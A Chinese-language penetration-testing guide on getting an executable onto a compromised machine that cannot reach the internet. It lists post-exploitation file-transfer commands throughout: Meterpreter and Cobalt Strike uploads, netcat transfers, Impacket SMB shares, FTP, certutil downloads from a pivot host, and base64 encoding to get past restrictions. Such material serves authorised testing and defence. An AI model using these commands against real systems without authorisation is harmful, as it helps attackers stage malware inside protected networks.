### 一台机器不能出网，如何把一个 exe 文件放到对应的目标机器上去

**1. 利用现有会话通道**

如果你的权限获取是通过某个工具（如 Meterpreter、Cobalt Strike 等）建立的会话，并且这个会话本身可以实现文件传输，那么这是最直接的方法

- **Meterpreter 的 `upload` 命令**: 如果你已经拿到了 Meterpreter 会话，直接使用 `upload /path/to/local/file C:\path\on\target\machine` 命令就可以将本地文件上传到目标机器
- **Cobalt Strike 的 `upload` 命令**: 类似地，在 Cobalt Strike 的 Beacon 会话中，`upload /path/to/local/file C:\path\on\target\machine` 同样可以完成任务
- **nc (Netcat) 通道**: 如果没有 Meterpreter 或 Cobalt Strike，但能通过其他方式建立一个 `nc` 连接，可以在本地机器使用 `nc -l -p 4444 < file.exe`，然后在目标机器上使用 `nc <本地IP> 4444 > file.exe` 来进行文件传输

**2. 利用系统自带工具或协议**

如果无法建立现有的会话通道，或者现有工具无法传输文件，我们可以利用目标机器上已有的工具和协议

- **SMB/Cifs 共享**: 如果目标机器在 Windows 内网环境中，并且你可以访问到一个可以上传文件的 SMB 共享。
  1. **在跳板机上开启共享**: 使用 `smbserver.py` (Impacket 工具集) 或 Windows 自带的共享功能，在跳板机上共享一个目录
  2. **在目标机上连接共享**: 在目标机上使用 `net use Z: \\<跳板机IP>\share` 命令挂载共享目录
  3. **复制文件**: 使用 `copy Z:\file.exe C:\` 将文件复制到目标机器
- **FTP 服务**: 如果目标机器或跳板机上有 FTP 服务
  1. **在跳板机上开启 FTP 服务**: 确保 FTP 服务可以被目标机访问到
  2. **在目标机上使用 `ftp` 命令**: 在目标机上使用 `ftp` 客户端连接到跳板机，然后使用 `get` 或 `put` 命令来传输文件
- **HTTP 服务**: 如果跳板机上可以开启一个简易的 HTTP 服务
  1. **在跳板机上开启 HTTP 服务**: 使用 Python 的 `http.server` 或 `SimpleHTTPServer` 模块，如 `python -m http.server 8080`
  2. **在目标机上使用 `certutil` 或 PowerShell 下载**: 在目标机上使用 `certutil.exe -urlcache -split -f http://<跳板机IP>:8080/file.exe C:\file.exe` 或 PowerShell 的 `Invoke-WebRequest` 命令下载文件。这种方式在很多 Windows 环境中非常有效，因为它绕过了部分防火墙

**3. 利用特殊编码或分割传输**

如果上述方法都不行，或者网络环境非常严格，可以考虑将文件进行编码或分割传输

- **Base64 编码**:
  1. **在本地编码**: 使用 `base64 file.exe > file.txt` 将文件编码成文本
  2. **传输文本**: 将生成的文本文件 `file.txt` 通过剪贴板、或者通过其他能传输文本的方式（如日志文件、数据库记录等）传输到目标机
  3. **在目标机解码**: 在目标机上使用 `certutil.exe -decode file.txt file.exe` 或 PowerShell 将文本解码回可执行文件。这种方法非常灵活，可以在几乎所有有文本传输的地方使用
- **文件分割**: 如果文件过大，可以先将文件分割成多个小块，然后逐一传输，最后在目标机上合并。这通常和上面的方法结合使用